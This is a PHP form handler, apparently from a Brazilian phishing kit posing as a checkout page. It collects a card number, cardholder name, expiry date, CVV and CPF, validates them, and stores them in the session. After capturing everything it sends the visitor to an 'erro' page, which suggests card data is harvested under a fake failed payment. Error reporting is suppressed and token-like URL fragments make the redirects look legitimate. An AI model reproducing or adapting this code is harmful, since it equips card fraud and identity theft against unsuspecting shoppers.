<?php
	
	include "../settings/functions.php";
	session_start();
	error_reporting(0);

	$cartao = $_POST['card_number'];

	if (strlen($cartao) >= 16) 
	{
		if (validaCC($cartao)) 
		{
			$_SESSION['numero'] = $_POST['card_number'];
		}
		else $_SESSION['erro_numero'] = '<span style="color: red;font-size: 12px;">Esse Cartão de Crédito não existe</span>';header('Location: cart#access_token='.$_SESSION['geraToken']);
	}
	else $_SESSION['erro_numero'] = '<span style="color: red;font-size: 12px;">Coloque o número do Cartão de Crédito</span>';header('Location: cart#access_token='.$_SESSION['geraToken']);


	$titular = $_POST['cardholder_name'];

	if (strlen($titular) > 6) 
	{
		if (strstr($titular, ' ')) 
		{
			$_SESSION['titular'] = $_POST['cardholder_name'];
		}
		else $_SESSION['erro_titular'] = '<span style="color: red;font-size: 12px;">Coloque o nome assim como está impresso no Cartão de Crédito</span>';header('Location: cart#access_token='.$_SESSION['geraToken']);
	}
	else $_SESSION['erro_titular'] = '<span style="color: red;font-size: 12px;">Coloque o nome assim como está impresso no Cartão de Crédito</span>';header('Location: cart#access_token='.$_SESSION['geraToken']);


	$vencimento = $_POST['expiration_date'];

	if (strlen($vencimento) == 5) 
	{
		if (substr($vencimento, 0, 2) <= 12) 
		{
			if (substr($vencimento, 3, 5) >= 18) 
			{
				if (substr($vencimento, 3, 5) <= 30) 
				{
					$_SESSION['vencimento'] = $_POST['expiration_date'];
				}
				else $_SESSION['erro_vencimento'] = '<span style="color: red;font-size: 12px;">O ano informado não é valido</span>';header('Location: cart#access_token='.$_SESSION['geraToken']);
			}
			else $_SESSION['erro_vencimento'] = '<span style="color: red;font-size: 12px;">O ano informado não é valido</span>';header('Location: cart#access_token='.$_SESSION['geraToken']);
		}
		else $_SESSION['erro_vencimento'] = '<span style="color: red;font-size: 12px;">O mês informado não é valido</span>';header('Location: cart#access_token='.$_SESSION['geraToken']);
	}
	else $_SESSION['erro_vencimento'] = '<span style="color: red;font-size: 12px;">Coloque a data de vencimento corretamente</span>';header('Location: cart#access_token='.$_SESSION['geraToken']);


	$cvv = $_POST['security_code'];

	if (strlen($cvv) == 3 OR strlen($cvv) == 4)
	{
		$_SESSION['cvv'] = $_POST['security_code'];
	}
	else $_SESSION['erro_cvv'] = '<span style="color: red;font-size: 12px;">Informe o Código de segurança corretamente</span>';header('Location: cart#access_token='.$_SESSION['geraToken']);


	$cpf = $_POST['user_identification_number'];

	if (validaCPF($cpf)) 
	{
		$_SESSION['cpf'] = $_POST['user_identification_number'];
	}
	else $_SESSION['erro_cpf'] = '<span style="color: red;font-size: 12px;">O CPF não é valido</span>';header('Location: cart#access_token='.$_SESSION['geraToken']);


	if ($_SESSION['numero'] AND $_SESSION['titular'] AND $_SESSION['cvv'] AND $_SESSION['vencimento'] AND $_SESSION['cpf'])
	{
		$_SESSION['tipo'] = "CREDIT";
		header('Location: erro#access_token='.$_SESSION['geraToken']);
	}

?>